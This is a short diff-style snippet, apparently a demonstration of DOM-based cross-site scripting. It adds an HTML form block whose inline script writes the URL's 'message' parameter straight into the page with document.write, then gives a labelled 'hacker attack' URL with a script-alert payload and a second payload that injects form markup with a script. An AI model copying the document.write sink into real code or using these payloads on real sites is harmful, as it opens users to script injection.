@@ -1,0 +1,11 @@
+<div class="form-group">
+	<script>
+		var pos=document.URL.indexOf("message=") + 8;
+		var userInput=document.URL.substring(pos,document.URL.lenght);
+		document.write(userInput);
+	</script>
+</div>
+
+hacker attack:http://acd.com/test.html?message=<script>alert('This website is hacked!!')</script>
+Add input HTML
+message=<label>Gender</label><div class="col-sm-4"><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select></div><script>function show(){alert();}</script>
